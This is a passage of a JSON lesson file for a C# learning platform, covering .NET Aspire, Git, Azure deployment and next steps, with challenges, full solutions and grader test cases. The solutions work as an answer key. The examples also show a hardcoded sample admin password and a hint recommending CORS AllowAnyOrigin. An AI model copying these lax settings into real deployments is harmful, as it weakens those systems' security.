Write C# code\");\nConsole.WriteLine(\"  + Automatic networking\");\nConsole.WriteLine(\"  + Connection strings injected\");\nConsole.WriteLine(\"  + Beautiful dashboard (logs, traces, metrics)\");\nConsole.WriteLine(\"  + Click-to-debug in Visual Studio\");\nConsole.WriteLine(\"  + OpenTelemetry built-in\");\nConsole.WriteLine(\"  + Service discovery: just use service names!\");\n\nConsole.WriteLine(\"\\n.NET Aspire is the MODERN way to build distributed apps!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output contains 'ASPIRE'",
                  "expectedOutput": "ASPIRE",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output contains 'APPHOST'",
                  "expectedOutput": "APPHOST",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output contains 'AddRedis'",
                  "expectedOutput": "AddRedis",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output contains 'WithReference'",
                  "expectedOutput": "WithReference",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output contains 'ServiceDefaults'",
                  "expectedOutput": "ServiceDefaults",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output contains 'BENEFITS'",
                  "expectedOutput": "BENEFITS",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "AppHost: DistributedApplication.CreateBuilder(), AddRedis(), AddSqlServer().AddDatabase(), AddProject<T>().WithReference(). APIs: AddServiceDefaults(), AddSqlServerDbContext()."
                },
                {
                  "level": 2,
                  "text": "Service discovery: Use service names as hostnames! 'http://catalog-api' works because Aspire handles DNS."
                },
                {
                  "level": 3,
                  "text": "No connection strings: Aspire injects them via .WithReference(). Your code never hardcodes 'Server=localhost;Database=...'"
                },
                {
                  "level": 4,
                  "text": "Dashboard: Run AppHost, visit http://localhost:15888. See all services, logs, traces in one place!"
                },
                {
                  "level": 5,
                  "text": "Production: Replace AddRedis() with AddAzureRedis() or similar. Same code, different infrastructure."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Still using docker-compose",
                  "consequence": "Docker-compose is manual, error-prone, no observability. Aspire does everything automatically with a dashboard.",
                  "correction": "Use Aspire for local dev. Docker-compose only for legacy or non-.NET services."
                },
                {
                  "mistake": "Hardcoding connection strings",
                  "consequence": "Aspire injects connections via .WithReference(). Hardcoding defeats the purpose and breaks service discovery.",
                  "correction": "Let Aspire manage connections. Use AddSqlServerDbContext('name') not AddDbContext with connection string."
                },
                {
                  "mistake": "Forgetting AddServiceDefaults()",
                  "consequence": "Lose OpenTelemetry, health checks, and service discovery. Dashboard won't show full telemetry.",
                  "correction": "Every Aspire service needs AddServiceDefaults() and MapDefaultEndpoints()."
                },
                {
                  "mistake": "Not using service discovery",
                  "consequence": "Using localhost:5001 instead of 'catalog-api' breaks when deploying. Service discovery works everywhere.",
                  "correction": "Use service names from AppHost as hostnames. Aspire resolves them automatically."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-14-04",
          "title": "Version Control with Git (Save Your Work!)",
          "moduleId": "module-14",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Git is like a time machine for your code:\n\nWithout Git:\n• MyProject_v1.zip\n• MyProject_v2_FINAL.zip\n• MyProject_v2_FINAL_ACTUALLY_FINAL.zip\n• Mess!\n\nWith Git:\n• Track every change\n• Go back to any version\n• Work on features in branches\n• Collaborate with team\n• Never lose work!\n\nKey concepts:\n• COMMIT: Save snapshot of code\n• BRANCH: Work on features separately\n• PUSH: Upload to GitHub/Azure\n• PULL: Download from GitHub/Azure\n\nThink: Git = 'Professional version control. Every project needs it!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// GIT BASICS\n\n// Initialize repository\ngit init\n\n// Check status\ngit status\n\n// Add files to staging\ngit add .\ngit add Program.cs\n\n// Commit changes\ngit commit -m \"Add product CRUD endpoints\"\n\n// View history\ngit log\ngit log --oneline\n\n// BRANCHING\ngit branch feature/add-auth  // Create branch\ngit checkout feature/add-auth  // Switch to branch\ngit checkout -b feature/new-ui  // Create and switch\n\n// Work on feature, then merge\ngit checkout main\ngit merge feature/add-auth\n\n// REMOTE (GitHub/Azure DevOps)\ngit remote add origin https://github.com/user/repo.git\ngit push -u origin main\ngit pull origin main\n\n// TYPICAL WORKFLOW\n// 1. Create feature branch\ngit checkout -b feature/user-profile\n\n// 2. Make changes, commit often\ngit add .\ngit commit -m \"Add user profile page\"\n\n// 3. Push to remote\ngit push origin feature/user-profile\n\n// 4. Create Pull Request on GitHub\n// 5. Review, merge to main\n\n// USEFUL COMMANDS\ngit diff  // See changes\ngit restore Program.cs  // Undo changes\ngit reset --soft HEAD~1  // Undo last commit\ngit stash  // Save work temporarily\ngit stash pop  // Restore stashed work",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`git add / git commit`**: 'git add' stages files. 'git commit' saves snapshot. Commit message describes change. Use present tense: 'Add feature' not 'Added feature'.\n\n**`git branch / git checkout`**: Branches = separate timelines. Work on feature without affecting main. Checkout switches branches. Merge brings changes together.\n\n**`git push / git pull`**: Push uploads commits to GitHub. Pull downloads from GitHub. Sync with team! Push often to back up work.\n\n**`.gitignore`**: File listing what to ignore. Add: bin/, obj/, *.user, .vs/. Don't commit build outputs or secrets!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-14-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Git workflow simulation!\n\nSimulate these Git commands (print what each does):\n\n1. git init - Initialize repository\n2. git add . - Stage all files\n3. git commit -m \"Initial commit\" - First commit\n4. git status - Check status\n5. git branch feature/add-books - Create feature branch\n6. git checkout feature/add-books - Switch to branch\n7. (Make changes)\n8. git add .\n9. git commit -m \"Add book CRUD\"\n10. git checkout main - Back to main\n11. git merge feature/add-books - Merge feature\n12. git push origin main - Push to GitHub\n\nExplain each step!",
              "starterCode": "Console.WriteLine(\"=== GIT WORKFLOW SIMULATION ===\");\n\nConsole.WriteLine(\"\\n1. git init\");\nConsole.WriteLine(\"   Creates new Git repository in current folder\");\nConsole.WriteLine(\"   Initializes .git folder to track changes\");\n\n// Add other steps...",
              "solution": "Console.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  GIT VERSION CONTROL WORKFLOW\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\n\nConsole.WriteLine(\"STEP 1: Initialize Repository\");\nConsole.WriteLine(\"  Command: git init\");\nConsole.WriteLine(\"  Creates .git folder\");\nConsole.WriteLine(\"  Repository ready to track changes\\n\");\n\nConsole.WriteLine(\"STEP 2: Stage Files\");\nConsole.WriteLine(\"  Command: git add .\");\nConsole.WriteLine(\"  Stages all files for commit\");\nConsole.WriteLine(\"  Files in 'staging area' ready to commit\\n\");\n\nConsole.WriteLine(\"STEP 3: First Commit\");\nConsole.WriteLine(\"  Command: git commit -m 'Initial commit'\");\nConsole.WriteLine(\"  Saves snapshot of code\");\nConsole.WriteLine(\"  Commit ID: abc123... (unique hash)\\n\");\n\nConsole.WriteLine(\"STEP 4: Check Status\");\nConsole.WriteLine(\"  Command: git status\");\nConsole.WriteLine(\"  Shows: current branch, staged/unstaged files\");\nConsole.WriteLine(\"  Output: 'On branch main, nothing to commit'\\n\");\n\nConsole.WriteLine(\"STEP 5: Create Feature Branch\");\nConsole.WriteLine(\"  Command: git branch feature/add-books\");\nConsole.WriteLine(\"  Creates new branch for book feature\");\nConsole.WriteLine(\"  Doesn't switch yet - still on main\\n\");\n\nConsole.WriteLine(\"STEP 6: Switch to Feature Branch\");\nConsole.WriteLine(\"  Command: git checkout feature/add-books\");\nConsole.WriteLine(\"  Now working on feature branch\");\nConsole.WriteLine(\"  Changes won't affect main branch\\n\");\n\nConsole.WriteLine(\"STEP 7: Make Changes\");\nConsole.WriteLine(\"  Edit files: BookController.cs, BookService.cs\");\nConsole.WriteLine(\"  Add new files: Book.cs, IBookRepository.cs\\n\");\n\nConsole.WriteLine(\"STEP 8: Stage Changes\");\nConsole.WriteLine(\"  Command: git add .\");\nConsole.WriteLine(\"  Stages all modified and new files\\n\");\n\nConsole.WriteLine(\"STEP 9: Commit Feature\");\nConsole.WriteLine(\"  Command: git commit -m 'Add book CRUD operations'\");\nConsole.WriteLine(\"  Saves book feature snapshot\");\nConsole.WriteLine(\"  Feature complete on branch!\\n\");\n\nConsole.WriteLine(\"STEP 10: Return to Main\");\nConsole.WriteLine(\"  Command: git checkout main\");\nConsole.WriteLine(\"  Switches back to main branch\");\nConsole.WriteLine(\"  Book files disappear (they're on feature branch)\\n\");\n\nConsole.WriteLine(\"STEP 11: Merge Feature\");\nConsole.WriteLine(\"  Command: git merge feature/add-books\");\nConsole.WriteLine(\"  Brings book feature into main\");\nConsole.WriteLine(\"  Book files now in main branch!\\n\");\n\nConsole.WriteLine(\"STEP 12: Push to GitHub\");\nConsole.WriteLine(\"  Command: git push origin main\");\nConsole.WriteLine(\"  Uploads main branch to GitHub\");\nConsole.WriteLine(\"  Team can see changes, code is backed up!\\n\");\n\nConsole.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"✓ Professional Git workflow complete!\");\nConsole.WriteLine(\"✓ Feature developed in isolation\");\nConsole.WriteLine(\"✓ Merged to main when ready\");\nConsole.WriteLine(\"✓ Pushed to remote for backup/collaboration\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"git init\"",
                  "expectedOutput": "git init",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"git add\"",
                  "expectedOutput": "git add",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"git commit\"",
                  "expectedOutput": "git commit",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"branch\"",
                  "expectedOutput": "branch",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"merge\"",
                  "expectedOutput": "merge",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"push\"",
                  "expectedOutput": "push",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "git init → add → commit. Create branch, checkout, make changes, commit. Checkout main, merge branch. Push to remote. Learn: add, commit, branch, merge, push!"
                },
                {
                  "level": 2,
                  "text": "Committing without staging: 'git commit' commits STAGED files only! Must 'git add' first. 'git commit -am' stages and commits modified files (but not new files!)."
                },
                {
                  "level": 3,
                  "text": "Merge conflicts: If same file edited in two branches, merge creates conflict! Git marks conflicts in file. Resolve manually, then 'git add' and 'git commit'."
                },
                {
                  "level": 4,
                  "text": "Not pulling before push: Always 'git pull' before 'git push'! If remote has changes you don't have, push rejected. Pull first, resolve conflicts, then push."
                },
                {
                  "level": 5,
                  "text": "Committing secrets: NEVER commit passwords, API keys, connection strings! Use .gitignore for appsettings.json. Use environment variables or Azure Key Vault."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Committing without staging",
                  "consequence": "'git commit' commits STAGED files only! Must 'git add' first. 'git commit -am' stages and commits modified files (but not new files!).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Merge conflicts",
                  "consequence": "If same file edited in two branches, merge creates conflict! Git marks conflicts in file. Resolve manually, then 'git add' and 'git commit'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not pulling before push",
                  "consequence": "Always 'git pull' before 'git push'! If remote has changes you don't have, push rejected. Pull first, resolve conflicts, then push.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Committing secrets",
                  "consequence": "NEVER commit passwords, API keys, connection strings! Use .gitignore for appsettings.json. Use environment variables or Azure Key Vault.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-14-05",
          "title": "Deploying to Azure (Go Live!)",
          "moduleId": "module-14",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Deployment = Making your app available on the internet!\n\nLocal development (localhost):\n• Only YOU can access\n• Runs on your computer\n• Lost when computer off\n\nProduction (Azure):\n• EVERYONE can access\n• Runs in Microsoft data center\n• Always available (99.9% uptime!)\n\nAzure services for .NET:\n• Azure App Service - Host web apps/APIs\n• Azure SQL Database - Cloud database\n• Azure Blob Storage - File storage\n• Azure Key Vault - Secrets management\n\nThink: Azure = 'Microsoft's cloud platform. Professional hosting for your apps!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// AZURE APP SERVICE DEPLOYMENT\n\n// 1. Install Azure CLI\n// Download from: https://aka.ms/installazurecli\n\n// 2. Login to Azure\naz login\n\n// 3. Create Resource Group\naz group create --name MyAppRG --location eastus\n\n// 4. Create App Service Plan\naz appservice plan create \\\n  --name MyAppPlan \\\n  --resource-group MyAppRG \\\n  --sku B1 \\\n  --is-linux\n\n// 5. Create Web App\naz webapp create \\\n  --name MyUniqueAppName \\\n  --resource-group MyAppRG \\\n  --plan MyAppPlan \\\n  --runtime \"DOTNET|8.0\"\n\n// 6. Deploy from Git\naz webapp deployment source config \\\n  --name MyUniqueAppName \\\n  --resource-group MyAppRG \\\n  --repo-url https://github.com/user/repo \\\n  --branch main \\\n  --manual-integration\n\n// OR DEPLOY VIA VISUAL STUDIO\n// Right-click project → Publish → Azure → App Service\n// Follow wizard!\n\n// CONNECTION STRING IN AZURE\n// App Service → Configuration → Connection Strings\n// Add: Name=DefaultConnection, Value=your-sql-connection\n\n// ENVIRONMENT VARIABLES\n// Configuration → Application Settings\n// Add settings (API keys, secrets)\n\n// AZURE SQL DATABASE\naz sql server create \\\n  --name myserver123 \\\n  --resource-group MyAppRG \\\n  --location eastus \\\n  --admin-user sqladmin \\\n  --admin-password YourPassword123!\n\naz sql db create \\\n  --name MyDatabase \\\n  --server myserver123 \\\n  --resource-group MyAppRG \\\n  --service-objective S0\n\n// Update connection string in App Service\n// Server=myserver123.database.windows.net;\n// Database=MyDatabase;\n// User Id=sqladmin;\n// Password=YourPassword123!;\n\n// MONITORING\n// Azure Portal → App Service → Monitoring → Logs\n// View application logs, errors, performance",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`az login`**: Azure CLI authentication. Opens browser to login. Required before running az commands. Use 'az account show' to verify.\n\n**`Resource Group`**: Container for resources. Group related resources: app, database, storage. Easy to manage/delete together. Like folder for cloud resources.\n\n**`App Service Plan`**: Defines compute resources. B1 = Basic tier. F1 = Free (limited). P1V2 = Premium. Plan determines price and performance.\n\n**`Connection strings`**: Store in Azure Configuration, NOT code! Access via Environment.GetEnvironmentVariable(). Azure encrypts at rest."
            },
            {
              "type": "WARNING",
              "title": "Modern Deployment with Azure Developer CLI",
              "content": "## Azure Developer CLI (azd) - The Modern Way\n\n**Why azd?** One command to provision AND deploy!\n\n```bash\n# Install azd\nwinget install microsoft.azd\n\n# Initialize project (creates azure.yaml)\nazd init\n\n# Login to Azure\nazd auth login\n\n# Deploy everything!\nazd up\n```\n\n**azd + .NET Aspire** (best combo!):\n- `azd init` detects Aspire AppHost automatically\n- Creates Azure Container Apps infrastructure\n- Deploys all services with one command\n- Sets up networking, secrets, monitoring\n\n**Key azd commands:**\n- `azd up` = provision + deploy (full deployment)\n- `azd deploy` = deploy only (after infrastructure exists)\n- `azd down` = tear down all resources\n- `azd monitor` = open Application Insights\n\n**Container Apps vs App Service:**\n- Container Apps: Better for microservices, Aspire, containers\n- App Service: Simpler, traditional web apps\n- azd supports both!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-14-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Azure deployment simulation!\n\nPrint complete deployment workflow:\n\n1. Prepare app for production:\n   - Update connection strings to use environment variables\n   - Add health check endpoint\n   - Configure logging\n\n2. Azure CLI commands:\n   - Create resource group\n   - Create App Service plan\n   - Create web app\n   - Deploy code\n\n3. Post-deployment:\n   - Configure connection strings in Azure\n   - Set environment variables\n   - Enable HTTPS only\n   - Configure custom domain (optional)\n\n4. Monitoring:\n   - Check application logs\n   - Set up alerts\n   - Monitor performance\n\nPrint step-by-step guide!",
              "starterCode": "Console.WriteLine(\"=== AZURE DEPLOYMENT GUIDE ===\");\n\nConsole.WriteLine(\"\\nSTEP 1: Prepare Application\");\nConsole.WriteLine(\"  Update appsettings.json\");\nConsole.WriteLine(\"  Add health check\");\n\n// Continue with other steps...",
              "solution": "Console.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  AZURE DEPLOYMENT COMPLETE GUIDE\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\n\nConsole.WriteLine(\"PHASE 1: PREPARE APPLICATION\");\nConsole.WriteLine(\"\\n1.1 Update Connection Strings\");\nConsole.WriteLine(\"  Code: var connString = Environment.GetEnvironmentVariable(\\\"ConnectionString\\\");\");\nConsole.WriteLine(\"  Don't hardcode in appsettings.json!\");\n\nConsole.WriteLine(\"\\n1.2 Add Health Check\");\nConsole.WriteLine(\"  Code: app.MapHealthChecks(\\\"/health\\\");\");\nConsole.WriteLine(\"  Azure uses this to verify app is running\");\n\nConsole.WriteLine(\"\\n1.3 Configure Logging\");\nConsole.WriteLine(\"  Code: builder.Logging.AddAzureWebAppDiagnostics();\");\nConsole.WriteLine(\"  Sends logs to Azure Portal\");\n\nConsole.WriteLine(\"\\n\\nPHASE 2: AZURE CLI DEPLOYMENT\");\nConsole.WriteLine(\"\\n2.1 Login to Azure\");\nConsole.WriteLine(\"  $ az login\");\nConsole.WriteLine(\"  Opens browser, authenticate with Microsoft account\");\n\nConsole.WriteLine(\"\\n2.2 Create Resource Group\");\nConsole.WriteLine(\"  $ az group create --name MyAppRG --location eastus\");\nConsole.WriteLine(\"  Container for all resources\");\n\nConsole.WriteLine(\"\\n2.3 Create App Service Plan\");\nConsole.WriteLine(\"  $ az appservice plan create \\\\\");\nConsole.WriteLine(\"      --name MyAppPlan \\\\\");\nConsole.WriteLine(\"      --resource-group MyAppRG \\\\\");\nConsole.WriteLine(\"      --sku B1\");\nConsole.WriteLine(\"  B1 = Basic tier ($55/month)\");\n\nConsole.WriteLine(\"\\n2.4 Create Web App\");\nConsole.WriteLine(\"  $ az webapp create \\\\\");\nConsole.WriteLine(\"      --name MyUniqueAppName123 \\\\\");\nConsole.WriteLine(\"      --resource-group MyAppRG \\\\\");\nConsole.WriteLine(\"      --plan MyAppPlan \\\\\");\nConsole.WriteLine(\"      --runtime \\\"DOTNET|8.0\\\"\");\nConsole.WriteLine(\"  URL: https://myuniqueappname123.azurewebsites.net\");\n\nConsole.WriteLine(\"\\n2.5 Deploy via Git\");\nConsole.WriteLine(\"  $ az webapp deployment source config \\\\\");\nConsole.WriteLine(\"      --name MyUniqueAppName123 \\\\\");\nConsole.WriteLine(\"      --resource-group MyAppRG \\\\\");\nConsole.WriteLine(\"      --repo-url https://github.com/user/repo \\\\\");\nConsole.WriteLine(\"      --branch main\");\nConsole.WriteLine(\"  Azure pulls from GitHub, builds, deploys!\");\n\nConsole.WriteLine(\"\\n\\nPHASE 3: CONFIGURE PRODUCTION SETTINGS\");\nConsole.WriteLine(\"\\n3.1 Set Connection String\");\nConsole.WriteLine(\"  Azure Portal → App Service → Configuration → Connection Strings\");\nConsole.WriteLine(\"  Name: DefaultConnection\");\nConsole.WriteLine(\"  Value: Server=...;Database=...;User Id=...;Password=...;\");\nConsole.WriteLine(\"  Type: SQLAzure\");\n\nConsole.WriteLine(\"\\n3.2 Configure App Settings\");\nConsole.WriteLine(\"  Configuration → Application Settings\");\nConsole.WriteLine(\"  Add: API_KEY, EMAIL_SERVICE_URL, etc.\");\n\nConsole.WriteLine(\"\\n3.3 Enable HTTPS Only\");\nConsole.WriteLine(\"  Settings → Configuration → General Settings\");\nConsole.WriteLine(\"  HTTPS Only: On\");\nConsole.WriteLine(\"  Redirects HTTP → HTTPS automatically\");\n\nConsole.WriteLine(\"\\n3.4 Configure Custom Domain (Optional)\");\nConsole.WriteLine(\"  Custom Domains → Add custom domain\");\nConsole.WriteLine(\"  Domain: www.myapp.com\");\nConsole.WriteLine(\"  Add DNS CNAME record\");\n\nConsole.WriteLine(\"\\n\\nPHASE 4: MONITORING & MAINTENANCE\");\nConsole.WriteLine(\"\\n4.1 View Logs\");\nConsole.WriteLine(\"  Monitoring → Log stream\");\nConsole.WriteLine(\"  Real-time application logs\");\n\nConsole.WriteLine(\"\\n4.2 Set Up Alerts\");\nConsole.WriteLine(\"  Monitoring → Alerts → New alert rule\");\nConsole.WriteLine(\"  Alert if: Response time > 2s, Error rate > 5%\");\n\nConsole.WriteLine(\"\\n4.3 Monitor Performance\");\nConsole.WriteLine(\"  Application Insights → Performance\");\nConsole.WriteLine(\"  Track requests, dependencies, exceptions\");\n\nConsole.WriteLine(\"\\n4.4 Scale Up/Out\");\nConsole.WriteLine(\"  Scale Up: Bigger machine (more CPU/RAM)\");\nConsole.WriteLine(\"  Scale Out: More instances (load balancing)\");\n\nConsole.WriteLine(\"\\n═══════════════════════════════════════════\");\nConsole.WriteLine(\"✓ App deployed to Azure!\");\nConsole.WriteLine(\"✓ Accessible worldwide\");\nConsole.WriteLine(\"✓ Secure (HTTPS, secrets in Key Vault)\");\nConsole.WriteLine(\"✓ Monitored (logs, alerts, Application Insights)\");\nConsole.WriteLine(\"\\n🎉 YOU'RE LIVE ON THE INTERNET! 🎉\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Azure\"",
                  "expectedOutput": "Azure",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"deployment\"",
                  "expectedOutput": "deployment",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"App Service\"",
                  "expectedOutput": "App Service",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Configuration\"",
                  "expectedOutput": "Configuration",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"Monitoring\"",
                  "expectedOutput": "Monitoring",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Azure CLI: az login, az group create, az appservice plan create, az webapp create. Configure in Portal: Connection strings, App settings, HTTPS. Monitor: Logs, alerts, Application Insights."
                },
                {
                  "level": 2,
                  "text": "Connection string in code: NEVER commit connection strings! Use Azure Configuration or Key Vault. Access via Environment.GetEnvironmentVariable(). Secrets in config, not code!"
                },
                {
                  "level": 3,
                  "text": "CORS not configured: Blazor WebAssembly needs CORS! Add in API: app.UseCors(policy => policy.AllowAnyOrigin()). Without it, browser blocks requests."
                },
                {
                  "level": 4,
                  "text": "Not using HTTPS: Always enable 'HTTPS Only' in Azure! HTTP is insecure. SSL certificate automatic with Azure. No excuse for HTTP in production!"
                },
                {
                  "level": 5,
                  "text": "Ignoring costs: Azure costs money! Start with B1 or F1 (free). Monitor costs in Cost Management. Scale down when not needed. Don't leave expensive resources running!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Connection string in code",
                  "consequence": "NEVER commit connection strings! Use Azure Configuration or Key Vault. Access via Environment.GetEnvironmentVariable(). Secrets in config, not code!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "CORS not configured",
                  "consequence": "Blazor WebAssembly needs CORS! Add in API: app.UseCors(policy => policy.AllowAnyOrigin()). Without it, browser blocks requests.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not using HTTPS",
                  "consequence": "Always enable 'HTTPS Only' in Azure! HTTP is insecure. SSL certificate automatic with Azure. No excuse for HTTP in production!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Ignoring costs",
                  "consequence": "Azure costs money! Start with B1 or F1 (free). Monitor costs in Cost Management. Scale down when not needed. Don't leave expensive resources running!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-14-06",
          "title": "Next Steps (Your Journey Continues!)",
          "moduleId": "module-14",
          "order": 6,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Congratulations! You've completed the C# Learning Platform!\n\nYou now know:\n✅ C# fundamentals (variables, loops, methods)\n✅ Object-Oriented Programming (classes, inheritance, interfaces)\n✅ Error handling and debugging\n✅ LINQ for data querying\n✅ Async programming\n✅ ASP.NET Core APIs\n✅ Entity Framework Core + databases\n✅ Blazor for web UIs\n✅ Full-stack development\n✅ Git version control\n✅ Azure deployment\n\nYou're now a FULL-STACK .NET DEVELOPER!\n\nBut learning never stops. Here's what's next..."
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// YOUR LEARNING PATH CONTINUES:\n\n// DEEPEN YOUR SKILLS:\n// 1. Advanced C# Features\n//    - Delegates & Events\n//    - Reflection & Attributes\n//    - Expression Trees\n//    - Span<T> & Memory<T>\n\n// 2. Design Patterns\n//    - Repository Pattern\n//    - Unit of Work\n//    - Factory Pattern\n//    - Dependency Injection (advanced)\n\n// 3. Testing\n//    - Unit Testing (xUnit, NUnit)\n//    - Integration Testing\n//    - Mocking (Moq)\n//    - Test-Driven Development (TDD)\n\n// 4. Performance\n//    - Profiling & Optimization\n//    - Caching (Redis)\n//    - Message Queues (RabbitMQ, Azure Service Bus)\n//    - Microservices Architecture\n\n// 5. Security\n//    - Authentication (JWT, OAuth)\n//    - Authorization (Role/Policy-based)\n//    - OWASP Top 10\n//    - Secure coding practices\n\n// EXPLORE NEW TECHNOLOGIES:\n// - gRPC for high-performance APIs\n// - SignalR for real-time communication\n// - Azure Functions (serverless)\n// - Docker & Kubernetes\n// - .NET MAUI (cross-platform mobile)\n\n// BUILD PROJECTS:\n// - E-commerce site\n// - Social media platform\n// - Real-time chat app\n// - Task management system\n// - Portfolio website\n\n// JOIN THE COMMUNITY:\n// - GitHub: Contribute to open-source\n// - Stack Overflow: Ask & answer questions\n// - Twitter/X: Follow .NET developers\n// - Local meetups & conferences\n// - .NET Blog: devblogs.microsoft.com/dotnet",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Continuous Learning`**: Technology evolves fast! New C# features every year. Follow Microsoft Docs, blogs, YouTube channels. Stay current!\n\n**`Build Projects`**: Best way to learn: BUILD! Start small, iterate. Share on GitHub. Projects > Tutorials for learning.\n\n**`Join Community`**: Developers help developers! Ask questions, share knowledge. Twitter, Discord, Stack Overflow. You're not alone!\n\n**`Get Certified`**: Microsoft certifications: AZ-204 (Azure Developer), AZ-900 (Azure Fundamentals). Validates skills, helps career."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-14-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create your learning roadmap!\n\nPrint a personalized plan with:\n\n1. What you've learned (review curriculum)\n2. Skills to deepen (pick 3 topics)\n3. Projects to build (3 project ideas)\n4. Resources to explore:\n   - Microsoft Learn paths\n   - YouTube channels\n   - Books to read\n   - Communities to join\n5. 30-day action plan\n6. 90-day goals\n7. 1-year vision\n\nThis is YOUR roadmap to mastery!",
              "starterCode": "Console.WriteLine(\"=== MY C# LEARNING ROADMAP ===\");\n\nConsole.WriteLine(\"\\nWHAT I'VE LEARNED:\");\nConsole.WriteLine(\"  ✓ C# fundamentals\");\nConsole.WriteLine(\"  ✓ OOP principles\");\n// List other topics...\n\nConsole.WriteLine(\"\\nNEXT SKILLS TO MASTER:\");\nConsole.WriteLine(\"  1. Testing (xUnit)\");\n// Add your choices...",
              "solution": "Console.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  YOUR C# MASTERY ROADMAP\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\n\nConsole.WriteLine(\"🎓 WHAT YOU'VE MASTERED:\");\nConsole.WriteLine(\"  ✓ C# Fundamentals (variables, loops, methods, classes)\");\nConsole.WriteLine(\"  ✓ Object-Oriented Programming (inheritance, polymorphism, interfaces)\");\nConsole.WriteLine(\"  ✓ Error Handling (try/catch, custom exceptions)\");\nConsole.WriteLine(\"  ✓ LINQ (querying, filtering, transforming data)\");\nConsole.WriteLine(\"  ✓ Async/Await (responsive applications)\");\nConsole.WriteLine(\"  ✓ ASP.NET Core (RESTful APIs, Minimal APIs)\");\nConsole.WriteLine(\"  ✓ Entity Framework Core (ORM, Code-First, migrations)\");\nConsole.WriteLine(\"  ✓ Blazor (interactive web UIs with C#)\");\nConsole.WriteLine(\"  ✓ Full-Stack Development (Frontend + Backend + Database)\");\nConsole.WriteLine(\"  ✓ Git (version control, branching, merging)\");\nConsole.WriteLine(\"  ✓ Azure (cloud deployment, App Service)\");\nConsole.WriteLine(\"\\n  🏆 YOU'RE A FULL-STACK .NET DEVELOPER!\\n\");\n\nConsole.WriteLine(\"📚 SKILLS TO DEEPEN (Choose 3):\");\nConsole.WriteLine(\"  1. Testing (xUnit, Integration Tests, TDD)\");\nConsole.WriteLine(\"  2. Authentication & Security (JWT, 